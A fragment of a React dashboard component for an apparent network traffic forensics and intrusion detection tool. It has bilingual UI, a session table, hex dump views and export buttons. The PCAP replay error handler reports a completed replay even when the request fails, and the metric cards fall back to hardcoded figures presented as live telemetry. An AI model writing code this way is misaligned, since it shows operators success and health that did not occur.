      ];

      let step = 0;
      const interval = setInterval(() => {
        step += 20;
        setReplayProgress(step);

        if (step === 40 && events.length > 3) {
          setReplayLogOutput(prev => [...prev, events[3], events[4]]);
        } else if (step === 80 && events.length > 5) {
          setReplayLogOutput(prev => [...prev, events[5], events[6]]);
        } else if (step >= 100) {
          clearInterval(interval);
          setIsReplaying(false);
          setReplayLogOutput(events);
          showToast(isZh ? 'PCAP 重放檢測完成，已產出威脅分析報表！' : 'PCAP Replay completed successfully.');
          fetchAllNdrData();
        }
      }, 500);
    } catch (e) {
      let step = 0;
      const interval = setInterval(() => {
        step += 25;
        setReplayProgress(step);
        if (step >= 100) {
          clearInterval(interval);
          setIsReplaying(false);
          setReplayLogOutput(prev => [
            ...prev,
            `[COMPLETE] PCAP 樣本重放完成，檢測特徵已同步。`
          ]);
          showToast(isZh ? 'PCAP 重放檢測完成！' : 'Replay completed');
        }
      }, 500);
    }
  };

  return (
    <div className="flex flex-col gap-6 text-slate-200">
      {/* Toast Notification */}
      <AnimatePresence>
        {toastMessage && (
          <motion.div
            initial={{ opacity: 0, y: -20, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: -20, scale: 0.95 }}
            className="fixed top-20 right-8 z-50 px-5 py-3.5 bg-[#111114] border border-blue-500/40 text-white rounded-2xl shadow-2xl flex items-center gap-3 backdrop-blur-md"
          >
            <div className="w-2.5 h-2.5 rounded-full bg-blue-500 animate-pulse" />
            <span className="text-xs font-bold font-mono tracking-wide">{toastMessage}</span>
          </motion.div>
        )}
      </AnimatePresence>

      {/* HEADER WITH REALTIME TELEMETRY KPI CARDS */}
      <div className="flex flex-col gap-6">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
          <div className="flex items-center gap-3.5">
            <div className="p-3 bg-gradient-to-br from-blue-600/20 to-indigo-600/10 border border-blue-500/30 rounded-2xl shadow-lg">
              <Activity className="w-7 h-7 text-blue-400" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-xl font-black text-white tracking-wider">
                  {isZh ? 'SEMOR Flow (NDR) 分散式網路流量與封包鑑識中心' : 'SEMOR Flow (NDR) Network Traffic & PCAP Forensics'}
                </h1>
                <span className="px-2 py-0.5 bg-blue-600/20 text-blue-400 border border-blue-500/30 text-[10px] font-black rounded-md font-mono uppercase">
                  Arkime + Suricata
                </span>
              </div>
              <p className="text-xs text-gray-400 mt-1">
                {isZh 
                  ? '全封包擷取 (Full Packet Capture)、高階協定還原、即時 Suricata IDS 威脅偵測與 NetFlow 會話鑑識' 
                  : 'Full packet capture, deep protocol decoding, real-time Suricata IDS inspection, and NetFlow session analytics'}
              </p>
            </div>
          </div>

          {/* Quick Engine Telemetry Status */}
          <div className="flex items-center gap-2">
            <button 
              onClick={handleRefreshProbes}
              disabled={isRefreshing}
              className="p-2.5 bg-[#111114] hover:bg-gray-800 border border-gray-800 rounded-xl text-gray-400 hover:text-white transition-colors"
              title={isZh ? '刷新 TAP 探針與快取' : 'Refresh'}
            >
              <RefreshCw size={14} className={cn(isRefreshing && "animate-spin text-blue-400")} />
            </button>
            <button
              onClick={handleToggleCapture}
              className="flex items-center gap-2 px-3 py-2 bg-[#111114] hover:bg-gray-800 border border-gray-800 rounded-xl text-xs font-mono text-gray-300 transition-colors"
              title={isZh ? '點擊切換封包擷取狀態 (暫停/恢復)' : 'Toggle live packet capture'}
            >
              <div className={cn("w-2 h-2 rounded-full", isLiveCapture ? "bg-emerald-500 animate-pulse" : "bg-amber-500")} />
              <span>{isZh ? '零拷貝擷取介面 (AF_PACKET)' : 'Capture Engine'}: <strong className={isLiveCapture ? "text-emerald-400" : "text-amber-400"}>{isLiveCapture ? 'ACTIVE' : 'PAUSED'}</strong></span>
            </button>
          </div>
        </div>

        {/* 4 Telemetry Metrics Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-[#111114] border border-gray-800/80 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
            <div className="flex items-center justify-between text-gray-400 text-xs">
              <span className="font-bold uppercase tracking-wider">{isZh ? '即時流量擷取速率' : 'Capture Bandwidth'}</span>
              <Activity size={14} className="text-blue-400" />
            </div>
            <div className="flex items-baseline justify-between mt-3">
              <span className="text-2xl font-black text-white font-mono">
                {telemetry?.throughput?.currentGbps ? `${telemetry.throughput.currentGbps} Gbps` : '1.85 Gbps'}
              </span>
              <span className="text-xs font-bold text-emerald-400 flex items-center gap-0.5">
                <TrendingUp size={12} /> +18.4%
              </span>
            </div>
            <div className="mt-3 flex items-center justify-between text-[10px] text-gray-500 border-t border-gray-800/60 pt-2 font-mono">
              <span>{isZh ? '40G 聚合交換通道' : 'Aggregation Link'}</span>
              <span className="text-blue-400 font-bold">{telemetry?.throughput?.aggregationLoadPct ? `${telemetry.throughput.aggregationLoadPct}% Load` : '4.6% Load'}</span>
            </div>
          </div>

          <div className="bg-[#111114] border border-gray-800/80 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
            <div className="flex items-center justify-between text-gray-400 text-xs">
              <span className="font-bold uppercase tracking-wider">{isZh ? '封包解析吞吐速率' : 'Packet Index Speed'}</span>
              <Cpu size={14} className="text-purple-400" />
            </div>
            <div className="flex items-baseline justify-between mt-3">
              <span className="text-2xl font-black text-white font-mono">
                {telemetry?.throughput?.currentPps || '1.24M pps'}
              </span>
              <span className="text-xs font-bold text-purple-400 font-mono">
                {telemetry?.throughput?.currentEps || '940k EPS'}
              </span>
            </div>
            <div className="mt-3 flex items-center justify-between text-[10px] text-gray-500 border-t border-gray-800/60 pt-2 font-mono">
              <span>{isZh ? '封包丟失率' : 'Packet Drop Rate'}</span>
              <span className="text-emerald-400 font-bold">0.00% Zero-Drop</span>
            </div>
          </div>

          <div className="bg-[#111114] border border-gray-800/80 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
            <div className="flex items-center justify-between text-gray-400 text-xs">
              <span className="font-bold uppercase tracking-wider">{isZh ? '作用中連線 Session' : 'Active Flow Sessions'}</span>
              <Network size={14} className="text-emerald-400" />
            </div>
            <div className="flex items-baseline justify-between mt-3">
              <span className="text-2xl font-black text-white font-mono">
                {telemetry?.throughput?.activeFlows ? telemetry.throughput.activeFlows.toLocaleString() : '58,420'}
              </span>
              <span className="text-xs font-bold text-emerald-400">+2,150/m</span>
            </div>
            <div className="mt-3 flex items-center justify-between text-[10px] text-gray-500 border-t border-gray-800/60 pt-2 font-mono">
              <span>{isZh ? 'TCP/UDP 追蹤表' : 'State Table'}</span>
              <span className="text-emerald-400 font-bold">Optimal (98%)</span>
            </div>
          </div>

          <div className="bg-[#111114] border border-gray-800/80 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
            <div className="flex items-center justify-between text-gray-400 text-xs">
              <span className="font-bold uppercase tracking-wider">{isZh ? 'Suricata 阻斷告警' : 'Threat Interceptions'}</span>
              <ShieldAlert size={14} className="text-rose-400" />
            </div>
            <div className="flex items-baseline justify-between mt-3">
              <span className="text-2xl font-black text-rose-400 font-mono">
                {telemetry?.alertsSummary?.total ? `${telemetry.alertsSummary.total} Alerts` : `${liveAlerts.length} Alerts`}
              </span>
              <span className="text-xs font-bold text-rose-400 bg-rose-500/10 px-2 py-0.5 rounded border border-rose-500/20">
                {telemetry?.alertsSummary?.critical ? `${telemetry.alertsSummary.critical} Critical` : `${liveAlerts.filter(a => a.severity === 'Critical').length} Critical`}
              </span>
            </div>
            <div className="mt-3 flex items-center justify-between text-[10px] text-gray-500 border-t border-gray-800/60 pt-2 font-mono">
              <span>{isZh ? '儲存保留空間' : 'PCAP Storage'}</span>
              <span className="text-gray-300 font-bold">
                {telemetry?.storage ? `${telemetry.storage.usedTB} TB / ${telemetry.storage.totalTB} TB` : '14.2 TB / 20 TB'}
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* NAVIGATION SUB-TABS */}
      <div className="flex items-center justify-between border-b border-gray-800/80 pb-1 overflow-x-auto custom-scrollbar">
        <div className="flex items-center gap-2">
          {[
            { id: 'forensics', label: isZh ? '🔬 封包鑑識與 PCAP 串流' : 'PCAP Forensics', icon: FileCode },
            { id: 'suricata', label: isZh ? '🛡️ Suricata IDS & 威脅檢測' : 'Suricata IDS & Zeek', icon: Shield },
            { id: 'topology', label: isZh ? '🌐 即時連線流量拓撲' : 'Traffic Topology', icon: Network },
            { id: 'heatmap', label: isZh ? '🔥 24H 流量熱力圖 (D3.js)' : '24h D3 Heatmap', icon: Flame },
            { id: 'bandwidth', label: isZh ? '📈 頻寬趨勢與 Top Talkers' : 'Bandwidth & Top Talkers', icon: BarChart2 },
            { id: 'replay', label: isZh ? '🧪 PCAP 重放與沙盒測試' : 'PCAP Replay & Simulator', icon: Radio }
          ].map(tab => {
            const Icon = tab.icon;
            const isActive = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as any)}
                className={cn(
                  "px-4 py-2.5 rounded-xl text-xs font-bold transition-all flex items-center gap-2 whitespace-nowrap",
                  isActive 
                    ? "bg-blue-600 text-white shadow-lg shadow-blue-600/25 border border-blue-500/40" 
                    : "text-gray-400 hover:text-white hover:bg-gray-800/60"
                )}
              >
                <Icon size={14} />
                <span>{tab.label}</span>
              </button>
            );
          })}
        </div>

        {/* Global Action Tools */}
        <div className="hidden md:flex items-center gap-2">
          <div className="flex items-center bg-[#111114] border border-gray-800 rounded-xl p-0.5">
            <button 
              onClick={() => {
                setExportScope('filtered');
                setIsExportModalOpen(true);
              }}
              className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-600 hover:bg-blue-500 rounded-lg text-[11px] font-bold text-white transition-colors shadow-sm"
              title={isZh ? '開啟 PCAP / CSV 鑑識匯出設定對話盒' : 'Configure PCAP / CSV forensic export'}
            >
              <FileDown size={12} /> {isZh ? '匯出 PCAP / CSV' : 'Export PCAP / CSV'}
            </button>
            <button
              onClick={() => handleExportTraffic(filteredSessions, 'pcapng')}
              className="px-2.5 py-1.5 hover:bg-gray-800 rounded-lg text-[10px] font-mono font-bold text-gray-400 hover:text-white transition-colors"
              title={isZh ? '立即下載已篩選連線為 .pcapng' : 'Quick download filtered as .pcapng'}
            >
              .pcapng
            </button>
            <button
              onClick={() => handleExportTraffic(filteredSessions, 'pcap')}
              className="px-2.5 py-1.5 hover:bg-gray-800 rounded-lg text-[10px] font-mono font-bold text-gray-400 hover:text-white transition-colors"
              title={isZh ? '立即下載已篩選連線為 .pcap' : 'Quick download filtered as .pcap'}
            >
              .pcap
            </button>
            <button
              onClick={() => handleExportTraffic(filteredSessions, 'csv')}
              className="px-2.5 py-1.5 hover:bg-emerald-600/20 text-emerald-400 hover:text-emerald-300 rounded-lg text-[10px] font-mono font-bold transition-colors border-l border-gray-800"
              title={isZh ? '立即下載已篩選連線為鑑識分析 .csv 檔 (相容 Excel / SIEM)' : 'Quick download filtered as .csv'}
            >
              .csv
            </button>
          </div>
          <button 
            onClick={() => {
              navigator.clipboard.writeText(`curl -X GET "https://soc.corp.internal/api/v1/ndr/export?query=${encodeURIComponent(pcapFilterQuery || '*')}&format=csv" -H "Authorization: Bearer <API_KEY>"`);
              showToast(isZh ? '已複製 NDR 鑑識資料匯出 REST API cURL 指令！' : 'Copied NDR Forensics Export cURL command');
            }}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-[#111114] hover:bg-gray-800 border border-gray-800 rounded-xl text-[11px] font-bold text-gray-300 hover:text-white transition-colors"
          >
            <Share2 size={12} /> API cURL
          </button>
        </div>
      </div>

      {/* SUBTAB 1: 🔬 封包鑑識與 PCAP 串流 (FORENSICS) */}
      {activeTab === 'forensics' && (
        <div className="flex flex-col gap-6">
          {/* Wireshark / BPF Filter Search Bar */}
          <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl backdrop-blur-md flex flex-col gap-3.5">
            <div className="flex flex-col lg:flex-row items-stretch lg:items-center gap-3">
              <div className="flex-1 relative flex items-center">
                <Search size={15} className="absolute left-4 text-blue-400 pointer-events-none" />
                <span className="absolute left-10 text-[10px] font-mono font-black text-gray-500 border-r border-gray-700 pr-2 uppercase pointer-events-none">
                  BPF / PCAP
                </span>
                <input 
                  type="text" 
                  placeholder={isZh ? 'Wireshark/BPF 語法篩選 (例如: ip.addr == 10.88.88.106 && (tcp.port == 443 || udp.port == 53))...' : 'Filter PCAP sessions (e.g. ip.addr == 10.88.88.106 && tcp.port == 443)...'}
                  className="w-full bg-[#09090b] border border-gray-800 focus:border-blue-500 rounded-2xl py-3 pl-32 pr-20 text-xs font-mono text-slate-200 placeholder:text-gray-600 focus:outline-none transition-all shadow-inner"
                  value={pcapFilterQuery}
                  onChange={(e) => setPcapFilterQuery(e.target.value)}
                />
                {pcapFilterQuery && (
                  <button 
                    onClick={() => setPcapFilterQuery('')}
                    className="absolute right-4 p-1 hover:bg-gray-800 rounded-lg text-gray-500 hover:text-gray-300"
                  >
                    <X size={13} />
                  </button>
                )}
              </div>

              {/* Protocol Filter */}
              <div className="flex items-center gap-1.5 bg-[#09090b] border border-gray-800 rounded-2xl p-1 text-xs">
                {['ALL', 'HTTPS', 'HTTP', 'DNS', 'SSH', 'PostgreSQL'].map((proto) => (
                  <button
                    key={proto}
                    onClick={() => setSelectedProtoFilter(proto)}
                    className={cn(
                      "px-3 py-1.5 rounded-xl text-[11px] font-bold font-mono transition-colors",
                      selectedProtoFilter === proto ? "bg-blue-600 text-white shadow" : "text-gray-400 hover:text-white"
                    )}
                  >
                    {proto}
                  </button>
                ))}
              </div>

              {/* Threat Level Filter */}
              <select
                value={selectedThreatFilter}
                onChange={(e) => setSelectedThreatFilter(e.target.value)}
                className="bg-[#09090b] border border-gray-800 rounded-2xl px-3 py-3 text-xs font-bold text-gray-300 outline-none focus:border-blue-500"
              >
                <option value="ALL">{isZh ? '所有威脅等級' : 'All Severities'}</option>
                <option value="Critical">Critical (嚴重)</option>
                <option value="High">High (高)</option>
                <option value="Medium">Medium (中)</option>
                <option value="Clean">Clean (正常流量)</option>
              </select>

              {/* Quick Export Trigger */}
              <button
                onClick={() => {
                  setExportScope('filtered');
                  setIsExportModalOpen(true);
                }}
                className="px-3.5 py-3 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white rounded-2xl text-xs font-bold transition-all flex items-center gap-2 shadow-lg shadow-blue-600/20 whitespace-nowrap"
                title={isZh ? '匯出已篩選連線為 PCAP/PCAPNG 封包或 CSV 鑑識清單' : 'Export filtered traffic to PCAP/PCAPNG or CSV'}
              >
                <FileDown size={14} />
                <span>{isZh ? '匯出 PCAP/CSV' : 'Export PCAP/CSV'}</span>
                <span className="bg-white/20 text-[10px] px-1.5 py-0.5 rounded font-mono font-black">
                  {filteredSessions.length}
                </span>
              </button>
            </div>

            {/* Quick Filter Tag Buttons */}
            <div className="flex flex-wrap items-center gap-2 pt-2 border-t border-gray-800/80 text-[11px]">
              <span className="text-gray-500 font-bold flex items-center gap-1">
                <Bookmark size={11} className="text-amber-400" /> {isZh ? '常用篩選範本:' : 'Presets:'}
              </span>
              {[
                { label: '🚨 Lazarus C2 (TLS 1.3)', query: '185.220.101.45' },
                { label: '🌐 DNS 資料隱匿外洩 (Tunnel)', query: 'proto: DNS' },
                { label: '💥 Log4j RCE JNDI 注入', query: '198.51.100.89' },
                { label: '🔑 SSH 暴力破解連線', query: '22' },
                { label: '🗄️ 資料庫叢集複寫', query: '5432' }
              ].map((p, idx) => (
                <button
                  key={idx}
                  onClick={() => setPcapFilterQuery(p.query)}
                  className="px-2.5 py-1 bg-[#09090b] hover:bg-gray-800 border border-gray-800 rounded-xl text-gray-400 hover:text-white transition-colors"
                >
                  {p.label}
                </button>
              ))}
            </div>
          </div>

          {/* PCAP Session List & Deep Inspector */}
          <div className="bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl overflow-hidden">
            <div className="flex flex-wrap items-center justify-between gap-3 mb-4 pb-3 border-b border-gray-800">
              <div className="flex items-center gap-2">
                <FileCode className="w-4 h-4 text-blue-400" />
                <span className="text-xs font-black uppercase tracking-wider text-white">
                  {isZh ? '擷取網路連線會話清單 (Captured Flow Sessions)' : 'Captured Flow Sessions'}
                </span>
                <span className="text-[10px] font-mono bg-blue-600/10 border border-blue-500/30 text-blue-400 px-2.5 py-0.5 rounded-full font-bold">
                  {filteredSessions.length} {isZh ? '個連線串流' : 'sessions'}
                </span>
              </div>

              {/* PCAP & CSV Export Actions for Filtered Sessions */}
              <div className="flex items-center gap-2">
                <div className="flex items-center bg-[#09090b] border border-gray-800 rounded-xl p-0.5">
                  <button
                    onClick={() => {
                      setExportScope('filtered');
                      setIsExportModalOpen(true);
                    }}
                    className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-600 hover:bg-blue-500 rounded-lg text-xs font-bold text-white transition-all shadow-md shadow-blue-600/20"
                    title={isZh ? '開啟 PCAP / CSV 匯出設定對話盒' : 'Export current filtered traffic to PCAP / CSV'}
                  >
                    <FileDown size={13} />
                    <span>{isZh ? `匯出已篩選 (${filteredSessions.length})` : `Export Filtered (${filteredSessions.length})`}</span>
                  </button>
                  <button
                    onClick={() => handleExportTraffic(filteredSessions, 'pcapng')}
                    className="px-2.5 py-1.5 text-[10px] font-mono font-bold text-gray-400 hover:text-white hover:bg-gray-800/80 rounded-lg transition-colors"
                    title={isZh ? '立即下載已篩選流量為 Wireshark .pcapng 格式' : 'Direct download filtered traffic as .pcapng'}
                  >
                    .pcapng
                  </button>
                  <button
                    onClick={() => handleExportTraffic(filteredSessions, 'pcap')}
                    className="px-2.5 py-1.5 text-[10px] font-mono font-bold text-gray-400 hover:text-white hover:bg-gray-800/80 rounded-lg transition-colors"
                    title={isZh ? '立即下載已篩選流量為標準 Libpcap .pcap 格式' : 'Direct download filtered traffic as .pcap'}
                  >
                    .pcap
                  </button>
                  <button
                    onClick={() => handleExportTraffic(filteredSessions, 'csv')}
                    className="px-2.5 py-1.5 text-[10px] font-mono font-bold text-emerald-400 hover:text-emerald-300 hover:bg-emerald-500/10 rounded-lg transition-colors border-l border-gray-800"
                    title={isZh ? '立即下載已篩選流量為 CSV 鑑識連線紀錄 (相容 Excel / SIEM)' : 'Direct download filtered traffic as CSV forensic log'}
                  >
                    .csv
                  </button>
                </div>
              </div>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead>
                  <tr className="text-gray-500 uppercase text-[10px] tracking-wider border-b border-gray-800 pb-3">
                    <th className="pb-3 px-3">{isZh ? '時間' : 'Time'}</th>
                    <th className="pb-3 px-3">{isZh ? '來源端 (Src)' : 'Source'}</th>
                    <th className="pb-3 px-3">{isZh ? '目的端 (Dst)' : 'Destination'}</th>
                    <th className="pb-3 px-3">{isZh ? '應用層協定' : 'Protocol'}</th>
                    <th className="pb-3 px-3">{isZh ? '傳輸量' : 'Size / Packets'}</th>
                    <th className="pb-3 px-3">{isZh ? '威脅研判' : 'Threat Level'}</th>
                    <th className="pb-3 px-3">{isZh ? '防護動作' : 'Action'}</th>
                    <th className="pb-3 px-3 text-right">{isZh ? '封包詳情' : 'PCAP'}</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-800/60">
                  {filteredSessions.map((session) => (
                    <React.Fragment key={session.id}>
                      <tr 
                        className={cn(
                          "hover:bg-white/5 transition-colors cursor-pointer group",
                          expandedSessionId === session.id && "bg-blue-600/5"
                        )}
                        onClick={() => setExpandedSessionId(expandedSessionId === session.id ? null : session.id)}
                      >
                        <td className="py-3.5 px-3 text-gray-400">
                          <div className="flex items-center gap-2">
                            <ChevronRight size={13} className={cn("transition-transform text-gray-500", expandedSessionId === session.id && "rotate-90 text-blue-400")} />
                            <span>{session.time}</span>
                          </div>
                        </td>
                        <td className="py-3.5 px-3">
                          <div className="flex items-center gap-1.5">
                            <span>{session.geo_src?.flag}</span>
                            <span className="font-bold text-blue-400">{session.src_ip}</span>
                            <span className="text-gray-500">:{session.src_port}</span>
                          </div>
                        </td>
                        <td className="py-3.5 px-3">
                          <div className="flex items-center gap-1.5">
                            <span>{session.geo_dst?.flag}</span>
                            <span className="font-bold text-emerald-400">{session.dst_ip}</span>
                            <span className="text-gray-500">:{session.dst_port}</span>
                          </div>
                        </td>
                        <td className="py-3.5 px-3">
                          <span className="px-2 py-0.5 bg-[#09090b] border border-gray-800 rounded font-bold text-gray-300 text-[10px]">
                            {session.proto}
                          </span>
                        </td>
                        <td className="py-3.5 px-3 text-gray-300">
                          <div className="flex flex-col">
                            <span className="font-bold text-white">{session.bytes_in}</span>
                            <span className="text-[10px] text-gray-500">{session.packets} pkts ({session.duration_ms}ms)</span>
                          </div>
                        </td>
                        <td className="py-3.5 px-3">
                          <span className={cn(
                            "px-2.5 py-1 rounded-full text-[10px] font-black uppercase tracking-wider",
                            session.threat_level === 'Critical' ? "bg-rose-500/20 text-rose-400 border border-rose-500/30" :
                            session.threat_level === 'High' ? "bg-orange-500/20 text-orange-400 border border-orange-500/30" :
                            session.threat_level === 'Medium' ? "bg-amber-500/20 text-amber-400 border border-amber-500/30" :
                            "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20"
                          )}>
                            {session.threat_level}
                          </span>
                        </td>
                        <td className="py-3.5 px-3">
                          <span className={cn(
                            "text-[10px] font-bold px-2 py-0.5 rounded",
                            session.action === 'Blocked' ? "bg-rose-950 text-rose-300 border border-rose-800" :
                            session.action === 'Rate-limited' ? "bg-amber-950 text-amber-300 border border-amber-800" :
                            "bg-gray-800 text-gray-300"
                          )}>
                            {session.action}
                          </span>
                        </td>
                        <td className="py-3.5 px-3 text-right">
                          <button 
                            onClick={(e) => {
                              e.stopPropagation();
                              setSelectedSessionForModal(session);
                            }}
                            className="px-2.5 py-1 bg-blue-600/20 hover:bg-blue-600 text-blue-400 hover:text-white rounded-lg text-[10px] font-bold transition-all border border-blue-500/30"
                          >
                            {isZh ? '十六進位檢視' : 'Hex Dump'}
                          </button>
                        </td>
                      </tr>

                      {/* Expanded Deep Packet Inspector */}
                      <AnimatePresence>
                        {expandedSessionId === session.id && (
                          <tr>
                            <td colSpan={8} className="p-0 border-b border-gray-800">
                              <motion.div
                                initial={{ height: 0, opacity: 0 }}
                                animate={{ height: 'auto', opacity: 1 }}
                                exit={{ height: 0, opacity: 0 }}
                                className="overflow-hidden bg-[#0a0a0d] p-6 border-t border-gray-800 space-y-6"
                              >
                                {/* Threat Context Banner */}
                                {session.threat_desc && (
                                  <div className={cn(
                                    "p-3.5 rounded-2xl border flex items-center justify-between text-xs",
                                    session.threat_level === 'Critical' ? "bg-rose-950/40 border-rose-500/40 text-rose-200" :
                                    session.threat_level === 'High' ? "bg-orange-950/40 border-orange-500/40 text-orange-200" :
                                    "bg-blue-950/40 border-blue-500/40 text-blue-200"
                                  )}>
                                    <div className="flex items-center gap-2.5">
                                      <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0" />
                                      <div>
                                        <span className="font-black uppercase tracking-wider">{isZh ? '威脅偵測摘要' : 'Threat Intelligence Alert'}: </span>
                                        <span>{session.threat_desc}</span>
                                      </div>
                                    </div>
                                    <span className="font-mono text-[10px] bg-black/40 px-2 py-0.5 rounded border border-white/10">
                                      StreamID: {session.stream_id}
                                    </span>
                                  </div>
                                )}

                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                                  {/* Left: TCP Stream Follower */}
                                  <div className="space-y-4">
                                    <div className="flex items-center justify-between">
                                      <h4 className="text-xs font-black uppercase tracking-wider text-blue-400 flex items-center gap-2">
                                        <Terminal size={14} />
                                        {isZh ? 'TCP 對談時序交談 (Stream Follower)' : 'TCP Stream Follower'}
                                      </h4>
                                      <span className="text-[10px] text-gray-500 font-mono">
                                        Flags: {session.tcp_flags}
                                      </span>
                                    </div>

                                    <div className="space-y-2.5 relative">
                                      <div className="absolute left-3.5 top-2 bottom-2 w-px bg-gray-800" />
                                      {session.messages.map((m) => (
                                        <div key={m.seq} className="relative pl-8">
                                          <div className={cn(
                                            "absolute left-2.5 top-1.5 w-2 h-2 rounded-full border-2 border-gray-900",
                                            m.dir === 'out' ? "bg-blue-400" : "bg-emerald-400"
                                          )} />
                                          <div className="bg-[#111114] border border-gray-800/80 rounded-xl p-2.5 space-y-1">
                                            <div className="flex items-center justify-between text-[10px]">
                                              <div className="flex items-center gap-2">
                                                <span className="text-gray-500 font-mono">{m.time_offset}</span>
                                                <span className={cn(
                                                  "px-1.5 py-0.5 rounded font-black text-[9px] uppercase",
                                                  m.dir === 'out' ? "bg-blue-950 text-blue-300 border border-blue-800" : "bg-emerald-950 text-emerald-300 border border-emerald-800"
                                                )}>
                                                  {m.dir === 'out' ? 'OUTBOUND ->' : '<- INBOUND'}
                                                </span>
                                              </div>
                                              <span className="font-bold text-gray-300">{m.msg_type}</span>
                                            </div>
                                            <p className="text-[11px] font-mono text-gray-400 bg-black/40 p-1.5 rounded border border-white/5 truncate">
                                              {m.payload_preview}
                                            </p>
                                          </div>
                                        </div>
                                      ))}
                                    </div>
                                  </div>

                                  {/* Right: Hex Dump Preview & Protocol Decoded Attributes */}
                                  <div className="space-y-4">
                                    <div className="flex items-center justify-between">
                                      <h4 className="text-xs font-black uppercase tracking-wider text-purple-400 flex items-center gap-2">
                                        <Code size={14} />
                                        {isZh ? '十六進位傾印與封包摘要 (Hex Dump)' : 'Hex Dump & Decoded Details'}
                                      </h4>
                                      <button 
                                        onClick={() => {
                                          navigator.clipboard.writeText(session.hex_dump.map(h => `${h.offset}  ${h.hex}  |${h.ascii}|`).join('\n'));
                                          showToast(isZh ? '已複製 Hex Dump 字節至剪貼簿！' : 'Hex dump copied');
                                        }}
                                        className="text-[10px] text-gray-400 hover:text-white flex items-center gap-1 font-bold"
                                      >
                                        <Copy size={11} /> {isZh ? '複製字節' : 'Copy'}
                                      </button>
                                    </div>

                                    {/* Hex Window */}
                                    <div className="bg-black/60 rounded-2xl border border-gray-800 p-4 font-mono text-[11px] text-gray-400 space-y-1.5 shadow-inner overflow-x-auto custom-scrollbar">
                                      {session.hex_dump.map((h, hidx) => (
                                        <div key={hidx} className="flex gap-3 hover:bg-white/5 px-1.5 py-0.5 rounded transition-colors whitespace-nowrap">
                                          <span className="text-blue-500/70 font-bold w-10">{h.offset}</span>
                                          <span className="text-gray-300">{h.hex}</span>
                                          <span className="text-gray-700">|</span>
                                          <span className="text-purple-400/80 font-bold tracking-wider">{h.ascii}</span>
                                        </div>
                                      ))}
                                    </div>

                                    {/* Decoded Protocol Info */}
                                    {session.decoded_summary && (
                                      <div className="bg-[#111114] border border-gray-800 rounded-2xl p-3.5 space-y-2 text-xs">
                                        <span className="text-[10px] font-black uppercase tracking-wider text-emerald-400 block">
                                          {isZh ? '深度協定解析階層 (Decoded Protocol Stack)' : 'Protocol Stack'}
                                        </span>
                                        <div className="flex flex-wrap gap-1.5">
                                          {session.decoded_summary.protocol_stack.map((proto, pidx) => (
                                            <span key={pidx} className="px-2 py-0.5 bg-black/40 border border-gray-800 rounded text-[10px] font-mono text-gray-300">
                                              {proto}
                                            </span>
                                          ))}
                                        </div>

                                        <div className="pt-2 border-t border-gray-800/80 space-y-1 font-mono text-[11px]">
                                          {Object.entries(session.decoded_summary.details).map(([key, val]) => (
                                            <div key={key} className="flex justify-between items-center">
                                              <span className="text-gray-500">{key}:</span>
                                              <span className="text-gray-200 font-bold">{val}</span>
                                            </div>
                                          ))}
                                        </div>
                                      </div>
                                    )}

                                    {/* Action Buttons */}
                                    <div className="flex flex-wrap gap-2">
                                      <button 
                                        onClick={() => handleExportTraffic([session], 'pcapng')}
                                        className="flex-1 py-2 bg-blue-600/20 hover:bg-blue-600 text-blue-300 hover:text-white rounded-xl text-xs font-bold transition-all border border-blue-500/30 flex items-center justify-center gap-1.5 shadow-sm"
                                        title={isZh ? '以 Wireshark Next-Gen 格式 (.pcapng) 下載此連線' : 'Download session as .pcapng (Wireshark NG)'}
                                      >
                                        <FileDown size={13} /> {isZh ? '匯出 .pcapng' : 'Export .pcapng'}
                                      </button>
                                      <button 
                                        onClick={() => handleExportTraffic([session], 'pcap')}
                                        className="flex-1 py-2 bg-gray-800 hover:bg-gray-700 text-gray-200 hover:text-white rounded-xl text-xs font-bold transition-all border border-gray-700 flex items-center justify-center gap-1.5"
                                        title={isZh ? '以標準 Libpcap 格式 (.pcap) 下載此連線' : 'Download session as .pcap (Standard Libpcap)'}
                                      >
                                        <Download size={13} /> {isZh ? '匯出 .pcap' : 'Export .pcap'}
                                      </button>
                                      <button 
                                        onClick={() => handleExportTraffic([session], 'csv')}
                                        className="flex-1 py-2 bg-emerald-600/20 hover:bg-emerald-600 text-emerald-300 hover:text-white rounded-xl text-xs font-bold transition-all border border-emerald-500/30 flex items-center justify-center gap-1.5 shadow-sm"
                                        title={isZh ? '以 CSV 格式下載此連線之 5-Tuple、JA3 與 Payload 鑑識數據 (相容 Excel/Pandas)' : 'Download session as forensic CSV record'}
                                      >
                                        <FileSpreadsheet size={13} /> {isZh ? '匯出 .csv' : 'Export .csv'}
                                      </button>
                                      <button 
                                        onClick={() => handleBlockIp(session.src_ip, session.threat_desc)}
                                        className="py-2 px-3 bg-rose-600/20 hover:bg-rose-600 text-rose-300 hover:text-white rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-1.5 border border-rose-500/30"
                                      >
                                        <Shield size={13} /> {isZh ? '聯防阻斷此 IP' : 'Block IP'}
                                      </button>
                                    </div>
                                  </div>
                                </div>
                              </motion.div>
                            </td>
                          </tr>
                        )}
                      </AnimatePresence>
                    </React.Fragment>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* SUBTAB 2: 🛡️ Suricata IDS & Zeek 威脅檢測 (SURICATA) */}
